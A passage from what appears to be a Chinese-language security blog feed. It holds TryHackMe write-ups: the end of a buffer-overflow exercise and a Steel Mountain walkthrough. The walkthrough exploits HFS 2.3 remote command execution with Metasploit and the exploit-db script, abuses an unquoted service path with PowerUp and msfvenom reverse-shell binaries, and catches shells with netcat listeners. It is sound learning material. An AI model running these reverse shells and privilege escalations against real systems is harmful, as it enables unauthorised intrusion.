#98C379">LPORT=</span><span style="color: #D19A66">4444</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">EXITFUNC=thread</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x00\x07\x08\x2e\x2f\xa0\xa1&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">c</span></span></code></pre></div></div></figure><img src="/thm_bufferoverflow/image-20250707230034068.png" class="" title="image-20250707230034068"><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 把生成好的直接复制过来丢到 payload 就行，记得加上括号</span></span><span class="line"><span style="color: #61AFEF">payload</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> (</span><span style="color: #98C379">&quot;你&quot;</span></span><span class="line"><span style="color: #61AFEF">&quot;的&quot;</span></span><span class="line"><span style="color: #61AFEF">&quot;马&quot;</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure><h2 id="准备无操作字节（NOPs）"><a href="#准备无操作字节（NOPs）" class="headerlink" title="准备无操作字节（NOPs）"></a>准备无操作字节（NOPs）</h2><p>NOPs 的主要作用是为编码后的 Shellcode 提供必要的解包空间和稳定性，这个作用就是字面意思。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">padding</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x90&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">16</span></span></code></pre></div></div></figure><img src="/thm_bufferoverflow/image-20250707195035870.png" class="" title="image-20250707195035870"><p>顺利上线</p><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>简单画了个图，便于理解。</p><img src="/thm_bufferoverflow/image-20250707225512043.png" class="" title="image-20250707225512043">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Room：&lt;a href=&quot;https://tryhackme.com/room/bufferoverflowprep&quot;&gt;https://tryhackme.com/room/bufferoverflowprep&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;首先这个房间要有一点点计算机的底层知识</summary>
      
    
    
    
    <category term="THM" scheme="https://blog.irec.moe/categories/THM/"/>
    
    
    <category term="栈" scheme="https://blog.irec.moe/tags/%E6%A0%88/"/>
    
  </entry>
  
  <entry>
    <title>Try Hack Me - Steel Mountain</title>
    <link href="https://blog.irec.moe/thm_steelmountain.html"/>
    <id>https://blog.irec.moe/thm_steelmountain.html</id>
    <published>2025-07-04T16:00:00.000Z</published>
    <updated>2025-07-07T17:54:09.924Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x0"><a href="#0x0" class="headerlink" title="0x0"></a>0x0</h2><p>Room：<a href="https://tryhackme.com/room/steelmountain">https://tryhackme.com/room/steelmountain</a></p><p>这个房间可以说是我在 TryHackMe 上碰到的第一个需要用很多自己想法才能过的房间，其实别人也有很多题解的，但是每个人有不同的解法嘛，并且我觉得我把这个做出来之后感觉很有意思，也学了很多。</p><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>刚开始就来了一个看不懂的题目，在这里卡了很久。</p><blockquote><p>Who is the employee of the month?</p></blockquote><p>去搜了一下知道是那个替罪羊，但是我就不知道问题是怎么和这个题目联系上的，直到访问了这个服务器的 IP 之后才发现，hhhh。</p><img src="/thm_steelmountain/image-20250705005303024.png" class="" title="image-20250705005303024"><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p>就常规扫端口呗，nmap 一把梭。</p><figure class="shiki bash"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">nmap</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-sV</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.10</span><span style="color: #98C379">.208.117</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-T4</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># PORTSTATE SERVICE VERSION</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 80/tcp    open  http          Microsoft IIS httpd 8.5</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 135/tcp   open  msrpc         Microsoft Windows RPC</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 8080/tcp  open  http          HttpFileServer httpd 2.3</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 49152/tcp open  msrpc         Microsoft Windows RPC</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 49153/tcp open  msrpc         Microsoft Windows RPC</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 49154/tcp open  msrpc         Microsoft Windows RPC</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 49155/tcp open  msrpc         Microsoft Windows RPC</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 49156/tcp open  msrpc         Microsoft Windows RPC</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 49163/tcp open  msrpc         Microsoft Windows RPC</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span></span></code></pre></div></div></figure><p>题目问有另外一个端口跑着 HTTP 服务，试着访问一下 8080 看看。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">http://10.10.106.44:8080/</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">HttpFileServer 2.3</span></span><span class="line"><span style="color: #abb2bf">Server time: 7/4/2025 8:42:11 AM</span></span><span class="line"><span style="color: #abb2bf">Server uptime: 00:12:54</span></span></code></pre></div></div></figure><p>哟，这不是 HFS 吗，是 2.3 版本，应该是有洞的。</p><figure class="shiki bash"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">$</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">searchsploit</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">hfs</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">2.3</span></span><span class="line"><span style="color: #61AFEF">----------------------------------------------------</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">---------------------------------</span></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Exploit</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Title</span><span style="color: #ABB2BF">                                      |  </span><span style="color: #61AFEF">Path</span></span><span class="line"><span style="color: #61AFEF">----------------------------------------------------</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">---------------------------------</span></span><span class="line"><span style="color: #61AFEF">HFS</span><span style="color: #ABB2BF"> (HTTP </span><span style="color: #98C379">File</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Server</span><span style="color: #ABB2BF">) 2.3.x - Remote Command Execu | </span><span style="color: #61AFEF">windows/remote/49584.py</span></span><span class="line"><span style="color: #61AFEF">HFS</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Http</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">File</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Server</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">2.3</span><span style="color: #98C379">m</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Build</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">300</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">-</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Buffer</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Overfl</span><span style="color: #ABB2BF"> | </span><span style="color: #61AFEF">multiple/remote/48569.py</span></span><span class="line"><span style="color: #61AFEF">Rejetto</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">File</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Server</span><span style="color: #ABB2BF"> (HFS) - Remote Command Exe | </span><span style="color: #61AFEF">windows/remote/34926.rb</span></span><span class="line"><span style="color: #61AFEF">Rejetto</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">File</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Server</span><span style="color: #ABB2BF"> (HFS) 2.2/2.3 - Arbitrary  | </span><span style="color: #61AFEF">multiple/remote/30850.txt</span></span><span class="line"><span style="color: #61AFEF">Rejetto</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">File</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Server</span><span style="color: #ABB2BF"> (HFS) 2.3.x - Remote Comma | </span><span style="color: #61AFEF">windows/remote/34668.txt</span></span><span class="line"><span style="color: #61AFEF">Rejetto</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">File</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Server</span><span style="color: #ABB2BF"> (HFS) 2.3.x - Remote Comma | </span><span style="color: #61AFEF">windows/remote/39161.py</span></span><span class="line"><span style="color: #61AFEF">Rejetto</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">File</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Server</span><span style="color: #ABB2BF"> (HFS) 2.3a/2.3b/2.3c - Rem | </span><span style="color: #61AFEF">windows/webapps/34852.txt</span></span><span class="line"><span style="color: #61AFEF">----------------------------------------------------</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">---------------------------------</span></span></code></pre></div></div></figure><p>题目问我们 CVE 编号是什么，就去 <a href="https://www.exploit-db.com/">exploit-db</a> 上查查呗。然后看到了这个：<a href="https://www.exploit-db.com/exploits/39161%EF%BC%8C%E5%B0%B1%E6%98%AF%E8%BF%99%E4%B8%AA%E6%B2%A1%E9%94%99%E4%BA%86%E3%80%82">https://www.exploit-db.com/exploits/39161，就是这个没错了。</a></p><p>最后一问是让我们去用 msf 利用漏洞去拿 shell，拿到之后 flag 也就在那几个位置呗，轻松秒杀。</p><figure class="shiki bash"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">search</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">2014</span><span style="color: #98C379">-6287</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># exploit/windows/http/rejetto_hfs_exec</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">msf6</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">exploit</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">windows/http/rejetto_hfs_exec</span><span style="color: #ABB2BF">) &gt; </span><span style="color: #98C379">run</span></span><span class="line"><span style="color: #ABB2BF">[*] Started reverse TCP handler on 10.11.141.2:5555 </span></span><span class="line"><span style="color: #ABB2BF">[*] Using URL: http://10.11.141.2:8080/gv4t5KWp</span></span><span class="line"><span style="color: #ABB2BF">[*] Server started.</span></span><span class="line"><span style="color: #ABB2BF">[*] Sending a malicious request to /</span></span><span class="line"><span style="color: #ABB2BF">[*] Payload request received: /gv4t5KWp</span></span><span class="line"><span style="color: #ABB2BF">[*] Sending stage (</span><span style="color: #61AFEF">177734</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">bytes</span><span style="color: #ABB2BF">) to 10.10.208.117</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #56B6C2">!</span><span style="color: #ABB2BF">] Tried to delete %TEMP%</span><span style="color: #56B6C2">\c</span><span style="color: #ABB2BF">KRtdaA.vbs, unknown result</span></span><span class="line"><span style="color: #ABB2BF">[*] Meterpreter session 1 opened (</span><span style="color: #61AFEF">10.11.141.2:5555</span><span style="color: #ABB2BF"> -&gt; </span><span style="color: #D19A66">10.10</span><span style="color: #98C379">.208.117:49245</span><span style="color: #ABB2BF">) at 2025-07-04 13:09:50 -0400</span></span><span class="line"><span style="color: #ABB2BF">[*] Server stopped.</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">meterpreter</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">cd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;C:\Users\bill\Desktop&#39;</span></span><span class="line"><span style="color: #61AFEF">meterpreter</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">ls</span></span><span class="line"><span style="color: #61AFEF">Listing:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">C:</span><span style="color: #56B6C2">\U</span><span style="color: #98C379">sers</span><span style="color: #56B6C2">\b</span><span style="color: #98C379">ill</span><span style="color: #56B6C2">\D</span><span style="color: #98C379">esktop</span></span><span class="line"><span style="color: #ABB2BF">==============================</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">Mode</span><span style="color: #ABB2BF">              </span><span style="color: #98C379">Size</span><span style="color: #ABB2BF">  </span><span style="color: #98C379">Type</span><span style="color: #ABB2BF">  </span><span style="color: #98C379">Last</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">modified</span><span style="color: #ABB2BF">              </span><span style="color: #98C379">Name</span></span><span class="line"><span style="color: #61AFEF">----</span><span style="color: #ABB2BF">              </span><span style="color: #D19A66">----</span><span style="color: #ABB2BF">  </span><span style="color: #D19A66">----</span><span style="color: #ABB2BF">  </span><span style="color: #D19A66">-------------</span><span style="color: #ABB2BF">              </span><span style="color: #D19A66">----</span></span><span class="line"><span style="color: #61AFEF">100666/rw-rw-rw-</span><span style="color: #ABB2BF">  </span><span style="color: #D19A66">282</span><span style="color: #ABB2BF">   </span><span style="color: #98C379">fil</span><span style="color: #ABB2BF">   </span><span style="color: #D19A66">2019</span><span style="color: #98C379">-09-27</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">07</span><span style="color: #98C379">:07:07</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-0400</span><span style="color: #ABB2BF">  </span><span style="color: #98C379">desktop.ini</span></span><span class="line"><span style="color: #61AFEF">100666/rw-rw-rw-</span><span style="color: #ABB2BF">  </span><span style="color: #D19A66">70</span><span style="color: #ABB2BF">    </span><span style="color: #98C379">fil</span><span style="color: #ABB2BF">   </span><span style="color: #D19A66">2019</span><span style="color: #98C379">-09-27</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">08</span><span style="color: #98C379">:42:38</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-0400</span><span style="color: #ABB2BF">  </span><span style="color: #98C379">user.txt</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">meterpreter</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">cat</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">user.txt</span></span><span class="line"><span style="color: #61AFEF">b04763b6fcf51fcd7c13abc7db4fd365</span></span></code></pre></div></div></figure><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><p>标题写的是提权，这里其实是用 Windows 的服务的缺陷。</p><p>在 Windows 系统中，如果一个服务（Service）的可执行文件路径<strong>沒有用双引号完全括起來</strong>，且路径中<strong>包含空格</strong>，就会存在漏洞。</p><p>举例来说，如果服务路径是 <code>C:\Program Files\My Service\service.exe</code> 但没有加引号，系统在启动时可能会误以为它要执行的是 <code>C:\Program.exe</code> 或 <code>C:\Program Files\My.exe</code>。</p><p>攻击者可以利用这个缺陷，在这些被系统「误读」的位置提前放置一个<strong>恶意的同名可执行文件</strong>。由于服务通常以高权限运行（如 SYSTEM），当服务下次启动时，就会先执行攻击者的恶意程序，从而实现提权。</p><p>这里题目给我们提供了一个叫 <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp</a> 的工具，去查看系统里面的可利用点。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">meterpreter &gt; upload ~</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">Desktop</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">tq</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">PowerUp.ps1</span></span><span class="line"><span style="color: #ABB2BF">meterpreter &gt; powershell_shell</span></span><span class="line"><span style="color: #ABB2BF">PS &gt; whoami</span></span><span class="line"><span style="color: #ABB2BF">steelmountain\bill</span></span><span class="line"><span style="color: #ABB2BF">PS &gt; . .\PowerUp.ps1                     </span></span><span class="line"><span style="color: #ABB2BF">PS &gt; </span><span style="color: #56B6C2">Invoke-AllChecks</span></span></code></pre></div></div></figure><p>然后 <code>. .\xxx</code> 的 <code>.</code> 是 PowerShell 的一个操作符，他的作用是将一个脚本的内容载入并执行到当前 PowerShell 会话的「作用域 (Scope)」中。TBH 我是第一次见到这种用法，也算是涨姿势了。然后 <code>Invoke-AllChecks</code> 是这个脚本的一个函数，后面单独执行这条函数，可以这样来理解。</p><p>有一大堆回显，题目告诉我们只要关注 <code>CanRestart</code> 这个参数，然后看看哪个服务的路径没有用引号包裹其他，然后我就找到了这个。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">ServiceName    : AdvancedSystemCareService9</span></span><span class="line"><span style="color: #ABB2BF">Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\</span><span style="color: #56B6C2">ASCService.exe</span></span><span class="line"><span style="color: #ABB2BF">ModifiablePath : </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">{</span><span style="color: #E06C75">ModifiablePath</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">C:\; </span><span style="color: #E06C75">IdentityReference</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">BUILTIN\Users; </span><span style="color: #E06C75">Permissions</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">AppendData</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">AddSubdirectory} </span></span><span class="line"><span style="color: #ABB2BF">StartName      : LocalSystem</span></span><span class="line"><span style="color: #ABB2BF">AbuseFunction  : </span><span style="color: #56B6C2">Write-ServiceBinary</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&#39;AdvancedSystemCareService9&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Path &lt;HijackPath&gt; </span></span><span class="line"><span style="color: #ABB2BF">CanRestart     : True</span></span><span class="line"><span style="color: #ABB2BF">Name           : AdvancedSystemCareService9           </span></span><span class="line"><span style="color: #ABB2BF">Check          : Unquoted Service Paths</span></span></code></pre></div></div></figure><p>这里就照搬原话吧，意思就是如果 <code>CanRestart</code> 是 <code>True</code> 的话，并且目录可写，我们就可以我们自己的马去替换掉这个服务，然后重启，就上线了。</p><blockquote><p>The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!</p></blockquote><figure class="shiki bash"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 生成反弹 Shell</span></span><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/shell_reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST=</span><span style="color: #D19A66">10.11</span><span style="color: #98C379">.141.2</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT=</span><span style="color: #D19A66">4443</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-e</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">x86/shikata_ga_nai</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">exe-service</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Advanced.exe</span></span></code></pre></div></div></figure><p>然后就是 upload，放文件，然后就不知道怎么办了。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">meterpreter</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">upload</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">~/Desktop/tq/Advanced.exe</span></span></code></pre></div></div></figure><p>其实在这里卡了很久，因为不知道怎么重启这个服务，后面搜了一下，其实这个在房间最后一部分有写的。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">sc stop AdvancedSystemCareService9</span></span><span class="line"><span style="color: #ABB2BF">sc start AdvancedSystemCareService9</span></span></code></pre></div></div></figure><p>顺利拿到 flag</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">└─$ </span><span style="color: #E06C75">nc</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">lvnp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">4443</span></span><span class="line"><span style="color: #ABB2BF">listening on [any] </span><span style="color: #D19A66">4443</span><span style="color: #ABB2BF"> ...  </span></span><span class="line"><span style="color: #ABB2BF">connect </span><span style="color: #C678DD">to</span><span style="color: #ABB2BF"> [</span><span style="color: #D19A66">10.11.141.2</span><span style="color: #ABB2BF">] </span><span style="color: #E06C75">from</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">UNKNOWN</span><span style="color: #ABB2BF">) [</span><span style="color: #D19A66">10.10.106.44</span><span style="color: #ABB2BF">] </span><span style="color: #D19A66">49285</span></span><span class="line"><span style="color: #ABB2BF">Microsoft Windows [Version </span><span style="color: #D19A66">6.3.9600</span><span style="color: #ABB2BF">]     </span></span><span class="line"><span style="color: #ABB2BF">(</span><span style="color: #E06C75">c</span><span style="color: #ABB2BF">) </span><span style="color: #D19A66">2013</span><span style="color: #ABB2BF"> Microsoft Corporation. All rights reserved.                                 </span></span><span class="line"><span style="color: #ABB2BF">C:\</span><span style="color: #E06C75">Windows</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">system32</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">cd</span><span style="color: #ABB2BF"> c:\</span><span style="color: #E06C75">Users</span></span><span class="line"><span style="color: #ABB2BF">c:\</span><span style="color: #E06C75">Users</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Administrator</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Desktop</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">type</span><span style="color: #ABB2BF"> root.txt       </span></span><span class="line"><span style="color: #ABB2BF">type root.txt</span></span><span class="line"><span style="color: #ABB2BF">9af5f314f57607c00fd09803a587db80</span></span></code></pre></div></div></figure><h2 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h2><p>第四部分呢，题目的用意就是让我们不要依赖 MSF，去下别人的 EXP 来利用，锻炼这个能力，说实话这个比第三问简单很多。</p><p>这里用的是 HFS 的洞，我还经常用这个来建文件共享来着呢，不过一般在内网用，这个作者做的新版 HFS 又不好用。</p><p>EXP 地址：<a href="https://www.exploit-db.com/exploits/39161">https://www.exploit-db.com/exploits/39161</a></p><p>注意脚本要用 python2 执行，把里面的 <code>ip_addr</code> 和 <code>local_port</code> 改成你自己的，然后要起一个 HTTP 服务器，这里我用的 Python。记得要把下载好的 <code>netcat.exe</code> 改名成 <code>nc.exe</code>。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">└─$</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">python</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-m</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http.server</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">80</span><span style="color: #ABB2BF">     </span></span><span class="line"><span style="color: #61AFEF">Serving</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">on</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0.0</span><span style="color: #98C379">.0.0</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">port</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">80</span><span style="color: #ABB2BF"> (http://0.0.0.0:80/) ...</span></span></code></pre></div></div></figure><p>脚本要执行两次，第一次是下 <code>nc.exe</code> ，第二次才是反弹 Shell，同样记得本地监听一下反弹的端口。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">└─$ nc </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">lvnp </span><span style="color: #D19A66">5566</span><span style="color: #ABB2BF">                                           </span></span><span class="line"><span style="color: #ABB2BF">listening on [</span><span style="color: #C678DD">any</span><span style="color: #ABB2BF">] </span><span style="color: #D19A66">5566</span><span style="color: #ABB2BF"> ...                                 </span></span><span class="line"><span style="color: #ABB2BF">connect to [</span><span style="color: #D19A66">10.11</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">141.2</span><span style="color: #ABB2BF">] </span><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> (UNKNOWN) [</span><span style="color: #D19A66">10.10</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">106.44</span><span style="color: #ABB2BF">] </span><span style="color: #D19A66">49323</span></span><span class="line"><span style="color: #ABB2BF">Microsoft Windows [</span><span style="color: #C678DD">Version</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">6.3</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">9600</span><span style="color: #ABB2BF">]                        </span></span><span class="line"><span style="color: #ABB2BF">(c) </span><span style="color: #D19A66">2013</span><span style="color: #ABB2BF"> Microsoft Corporation. All rights reserved.        </span></span><span class="line"><span style="color: #ABB2BF">C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt;whoami                          </span></span><span class="line"><span style="color: #ABB2BF">whoami      </span></span><span 